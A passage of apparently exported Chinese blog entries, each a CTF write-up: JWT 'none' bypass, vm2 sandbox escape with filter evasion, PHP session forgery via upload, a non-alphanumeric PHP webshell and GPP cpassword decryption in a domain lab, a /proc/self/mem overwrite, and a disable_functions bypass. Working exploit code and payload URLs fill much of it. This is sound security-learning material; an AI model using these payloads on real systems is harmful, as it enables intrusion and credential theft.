<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873521703081.png" alt="img"></p>
<ul>
<li>payload</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873528037874.png" alt="img"></p>
<ul>
<li>签证由三部分组成<ul>
<li>头（header）basee64</li>
<li>payload  base64</li>
<li>secret</li>
</ul>
</li>
<li>签证拿到上述东西后通过header中加密方式加盐的方式加密形成了签证。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873532192819.png" alt="img"></p>
<p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
<blockquote>
<p>1.修改头什么的算法为none</p>
<p>2.若secret较短可以直接使用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
<p>3.秘钥泄露</p>
<p>3.修改算法RS256为HS256</p>
</blockquote>
<p>在这道题中明显是修改算法为none进行绕过</p>
<p>构造jwt编写脚本</p>
<pre><code class="javascript">
const crypto = require(&#39;crypto&#39;);
const jwt = require(&#39;jsonwebtoken&#39;);

secretid=0.5;
username=&quot;admin&quot;;
password=&quot;admin&quot;;
rolled=&quot;no&quot;
const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
const token = jwt.sign({secretid, username, password,rolled}, secret, {algorithm: &#39;none&#39;});
console.log(token);
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString());
console.log(sid)
</code></pre>
<p>这里绕过需要有一个小trick，先注册一个账号然后再提交上面生成的JWT。SID绕过可以是””或者大于零小于1的数。这是为什么呢。</p>
<p>​        首先要绕过<code>sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>j就不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
<p>​        其次为什么小于1大于零0呢，我们需要一个<code>global.secrets</code>的值为null,但是如果是0的话就是我们注册那个了，这样的话就会提示需要签名，如果是大于1小于零正好可以绕过第一层检测并且使得值为null。当然如果你注册的账号够多大于1也是可以的。还有就是可以使用空字符串进行绕过，空数组也行，因为nodejs中弱类型比较的关系这个会在下一个文章中重点研究。</p>
<p>最终获得flag:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873550195855.png" alt="img"></p>
<h1 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h1><p>原题nodejs沙箱逃逸，但是对许多函数进行了过滤。</p>
<p>和题中一个操作在issue中一样我们找最新的版本的<a href="https://github.com/patriksimek/vm2/issues/225。" target="_blank" rel="noopener">exp</a>来测试。</p>
<pre><code>(function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
    }
})()</code></pre><p>但是自己打进去会发现是不行的。我们可以fuzz这个payload有哪些内容是被过滤的。process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤.这里我们可以用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a>进行绕过，而属性可以用[模板字符串]代替，而单引号双引号可以用反引号代替。</p>
<pre><code>`${`${`return proces`}s`}`</code></pre><p>最后修改得：</p>
<pre><code class="javascript">(function(){
       TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
         Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
    }
})()</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873745251856.png" alt="img"></p>
<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>题目直接给了源码：</p>
<pre><code class="php"> &lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>我们直接来看如何能拿到flag；代码中可以看到，首先我们<code>session</code>必须得是<code>admin</code>其次必须存在success.txt</p>
<pre><code class="php">if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}</code></pre>
<p>我们再看第二部分上传的代码,这里有四个重要参数，</p>
<ul>
<li><p><code>direction=upload</code></p>
</li>
<li><p><code>attr</code> 可以对上传路径产生影响</p>
</li>
<li><p>上传的 field是up_file</p>
</li>
<li><p>最后一点是上传文件名会拼接上文件内容本身的sha256，即</p>
</li>
</ul>
<blockquote>
<p>$file_path .= “_”.hash_file(“sha256”,$_FILES[‘up_file’][‘tmp_name’]);</p>
</blockquote>
<p>同时这里已经锁死目录在<code>/var/babyctf/</code>,代码已经对目录是否穿越进行了检查。而这个上传的目录正好又是我们session的存储位置代码开头就设置了session存储目录</p>
<blockquote>
<p>session_save_path(“/var/babyctf/“);</p>
</blockquote>
<p>那我们能不能上传一个session对session进行修改呢？我们看他会将文件本身的名字拼接<code>_sha256(file)</code>,那么我们计算出这个sha256把上传文件名改为sess不就变成一个session文件了。我们再修改cookie就能达到getflag的目的。</p>
<pre><code class="php">$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
}</code></pre>
<p>我们再看最后一部分下载的代码,这段代码很简单，直接direction=download并且post一个filename上去就能下载。这里我们可以直接读取当前session看看这个session是什么类型。</p>
<pre><code class="php"> elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}</code></pre>
<p>可以看到，这个session是php_binary类型</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874019524378.png" alt="img"></p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p>那么我们据此生成一个session文件</p>
<pre><code class="php">&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);
session_save_path(&quot;C:\\Users\\51763\\Desktop\\&quot;);
session_start();

$_SESSION[&#39;username&#39;] = &#39;admin&#39;;
?&gt;</code></pre>
<p>我们构造表单去上传这个文件,上传时候注意文件名改成<code>sess</code></p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;form action=&quot;http://fd32890b-1f94-4728-9e56-1261066852d8.node3.buuoj.cn/&quot; method=&quot;post&quot;
enctype=&quot;multipart/form-data&quot;&gt;
&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
&lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot; /&gt; 
&lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;success.txt&quot; /&gt; 
&lt;input type=&quot;file&quot; name=&quot;up_file&quot; id=&quot;file&quot; /&gt; 
&lt;br /&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>我们计算这个文件的sha256值是:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874022155480.png" alt="img"></p>
<p>我们再读取文件看看，是否上传成功。上传成功后将arr参数改成success.txt再上传一次，因为file_exists($filename)检测的是文件或文件夹是否存在，这我们只要建一个文件夹即可。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
<p>直接修改<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> 直接出来flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Hard_Pentest_1 复现</title>
    <url>//articles/d5850ed2ae.html</url>
    <content><![CDATA[<h2 id="无数字字母的webshell"><a href="#无数字字母的webshell" class="headerlink" title="无数字字母的webshell"></a>无数字字母的webshell</h2><p>上传绕过，只需用短标签、P神的无数字字母的webshell绕过即可，上传文件名绕过因为是windows直接大小写绕过。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="php">&lt;?= $_=[] ?&gt; 
&lt;?= $_=@&quot;$_&quot; ?&gt;
&lt;?= $_=$_[(&#39;!&#39;==&#39;@&#39;)] ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ = &quot;_&quot;.$__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ .= $__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++  ?&gt;
&lt;?= $_______ .= $__  ?&gt;

&lt;?= ${$_______}[&quot;_&quot;](${$_______}[&quot;__&quot;]) ?&gt;</code></pre>
<h3 id="写小马："><a href="#写小马：" class="headerlink" title="写小马："></a>写小马：</h3><pre><code class="http">http://47.113.219.76/uploads/d8ffd2952b7416f6096c2481dfad4351/6539886cfe4730b929fa714a800aa44a_6.Php?_=system&amp;__=echo &quot;&lt;?php phpinfo()?&gt;&quot;&gt;&gt;1.php</code></pre>
<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>上传cmd.exe后执行net user看到提示在<code>\\192.168.0.12\Hint</code></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032004.png" alt="20200507032004"></p>
<p>看到一个压缩包里面有flag1和flag2的提示。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032131.png" alt="20200507032131"></p>
<h3 id="SYSVOL还原组策略中保存的密码"><a href="#SYSVOL还原组策略中保存的密码" class="headerlink" title="SYSVOL还原组策略中保存的密码"></a>SYSVOL还原组策略中保存的密码</h3><p>参考3gstudent的-<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a>。</p>
<p>在域中，存在一个默认的共享路径：</p>
<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>这里的域可以在ipconfig /all下看到：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507022504.png" alt="20200507022504"></p>
<p>直接访问如下地址</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507022747.png" alt="20200507022747"></p>
<p>找到对应的策略组id配置文件，如下的Group.xml</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/Policies/{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}/Machine/Preferences/Groups/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507023026.png" alt="20200507023026"></p>
<p>简单的来说就是：<code>\SYSVOL</code>路径中保存了域内用户的一些配置信息-&gt;找到<code>HintZip_Pass</code>用户的配置信息-&gt;然后找到AES256加密的密钥，由于微软已经公开了私钥，那么就可以把这个登录密钥还原出来-&gt;最后解出压缩包。下面的cpasswd就是加密的秘钥</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032239.png" alt="20200507032239"></p>
<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre><code class="powershell">function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)

        switch ($Mod) {
        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        }


        $Base64Decoded = [Convert]::FromBase64String($Cpassword)

        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 

    catch {Write-Error $Error[0]}
}  
Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code></pre>
<p>执行：</p>
<pre><code>powershell -executionpolicy bypass -file 1.ps1</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507032803.png" alt="20200507032803"></p>
<p>压缩包的密码是：<code>zL1PpP@sSwO3d</code></p>
<p>得到flag:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032939.png" alt="20200507032939"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>【转载】西湖论剑 Flagshop 分析复现</title>
    <url>//articles/d5a07c1f3f.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
<li>(文章首发于合天智汇)比赛时候没能做出来，其实这道题就是一道pwn题。</li>
</ul>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ul>
<li>抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-112129@2x.png" alt="WX20201013-112129@2x"></p>
<ul>
<li>读取题目全部源码：</li>
</ul>
<blockquote>
<p>backend.php</p>
</blockquote>
<pre><code class="php">&lt;?php

$offset = isset($_GET[&#39;offset&#39;]) ? $_GET[&#39;offset&#39;] : 0;
$buffer = isset($_GET[&#39;buffer&#39;]) ? $_GET[&#39;buffer&#39;] : &quot;&quot;;

if (isset($_GET[&#39;writefile&#39;])) {
    $fp = fopen($_GET[&#39;writefile&#39;], &quot;a&quot;);
    fseek($fp, $offset);
    fwrite($fp, $buffer);
    fclose($fp);
}

if (isset($_GET[&#39;readfile&#39;])) {
    echo file_get_contents($_GET[&#39;readfile&#39;]);
}
?&gt;</code></pre>
<blockquote>
<p>index.php</p>
</blockquote>
<pre><code class="php">&lt;?php

if(!isset($_COOKIE[&#39;sandbox&#39;])) {
  $uuid = system(&quot;/var/www/html/copy&quot;);
  setcookie(&quot;sandbox&quot;, $uuid);
  header(&quot;Location: sandbox/&quot;.$uuid);
} else {
  header(&quot;Location: sandbox/&quot;.$_COOKIE[&#39;sandbox&#39;]);
}</code></pre>
<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><ul>
<li>从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。</li>
<li>做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(<a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a>)</li>
</ul>
<h3 id="内存泄露和动态链接库"><a href="#内存泄露和动态链接库" class="headerlink" title="内存泄露和动态链接库"></a>内存泄露和动态链接库</h3><blockquote>
<p> /proc/self/maps</p>
<p> 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
</blockquote>
<pre><code class="shell">address           perms offset  dev   inode   pathname
08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
08058000-0805b000 rwxp 00000000 00:00 0
40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
4013e000-40142000 rw-p 00000000 00:00 0
bffff000-c0000000 rwxp 00000000 00:00 0</code></pre>
<ul>
<li>通过SSRF漏洞直接读取<code>/proc/self/maps</code>来泄露当前程序调用的到动态链接库和内存地址。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-114932@2x.png" alt="WX20201013-114932@2x"></p>
<ul>
<li>直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：<code>0x0000000000046590</code></li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-115346@2x.png" alt="WX20201013-115346@2x"></p>
<ul>
<li>我们将动态链接库的地址加上<code>system</code>的偏移就能计算出<code>system</code>函数的地址。</li>
</ul>
<pre><code class="php">&lt;?php
echo dechex(0x7ffff5f40000+0x0000000000046590);
//system函数结果：0x7ffff5f86590
?&gt;</code></pre>
<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><ul>
<li><p>我们知道system函数的地址，我们就可以将open函数的地址替换为<code>system</code>函数的地址，我们在<code>file_get_contents</code>传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。</p>
</li>
<li><p>这里需要用到<code>/proc/self/exe</code></p>
</li>
</ul>
<blockquote>
<p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.</p>
</blockquote>
<ul>
<li>同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。</li>
</ul>
<pre><code class="php">&lt;?php
function packlli($value) {
    $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
    $lower = $value &amp; 0x00000000ffffffff;
    return pack(&#39;V2&#39;, $lower, $higher);
}

function unp($value) {
    return hexdec(bin2hex(strrev($value)));
}
function parseelf($bin_ver, $rela = false) {
    $bin = file_get_contents($bin_ver);
    $e_shoff = unp(substr($bin, 0x28, 8));
    $e_shentsize = unp(substr($bin, 0x3a, 2));
    $e_shnum = unp(substr($bin, 0x3c, 2));
    $e_shstrndx = unp(substr($bin, 0x3e, 2));

    for($i = 0; $i &lt; $e_shnum; $i += 1) {
        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
        if($sh_type == 11) { // SHT_DYNSYM 
            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB
            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
        }
        elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA
            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
    }

    if($rela) {
        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
            $r_offset = unp(substr($bin, $i, 8));
            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
            $name = &#39;&#39;;
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != &quot;\0&quot;) {
                $name .= $bin[$j];

            }

            if($name == &#39;open&#39;) {
                return $r_offset;
            }
        }
    }
    else {
        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
            $name_off = unp(substr($bin, $i, 4));
            $name = &#39;&#39;;
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != &quot;\0&quot;) {
                $name .= $bin[$j];
            }
            if($name == &#39;__libc_system&#39;) {
                $system_offset = unp(substr($bin, $i + 8, 8));
            }
            if($name == &#39;__open&#39;) {
                $open_offset = unp(substr($bin, $i + 8, 8));
            }
        }
        return array($system_offset, $open_offset);
    }
}
$open_php = parseelf(&#39;exe&#39;, true);
//$maps = file_get_contents(&#39;lib.txt&#39;);
//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
echo $open_php;
//结果：15333784
?&gt;</code></pre>
<h3 id="修改进程内存"><a href="#修改进程内存" class="headerlink" title="修改进程内存"></a>修改进程内存</h3><blockquote>
<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
</blockquote>
<ul>
<li><p>也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。</p>
<pre><code>backend.php?readfile=/readflag&gt;/tmp/i_o_u_hlq&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784</code></pre></li>
<li><p>直接读取<code>/tmp/i_o_u_hlq</code>就可以直接<code>getflag</code></p>
</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG2879.png" alt="WechatIMG2879"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p>Nu1L 西湖论剑wp</p>
</li>
<li><p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
</li>
<li><p><a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020-CheckIN</title>
    <url>//articles/d5c12b792b.html</url>
    <content><![CDATA[<p>base64加密一下可以直接RCE：</p>
<pre><code>?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></pre><p>测试发现<code>tmp</code>目录是可以写东西。但是直接读flag是没法读得。但是发现有readflag这个程序在根目录，但是这里把执行系统命令的函数都给禁了，这里要bypass 一下<code>disable function</code>.</p>
<p>直接exp一把梭：</p>
<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
<p>exp上传到/var/tmp/3.txt,直接包含执行就行了。</p>
<pre><code>http://ebd8d9e8-ee16-4153-8396-b65d3b3b95ac.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX0dFVFsnYSddKTs=&amp;a=var_dump(include(&#39;../../tmp/3.txt&#39;));</code></pre><blockquote>
<p> echo pwn(“echo <code>/readflag</code> &gt; /var/tmp/a.txt”);</p>
</blockquote>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200526145744.png" alt="微信图片_20200526145744"></p>
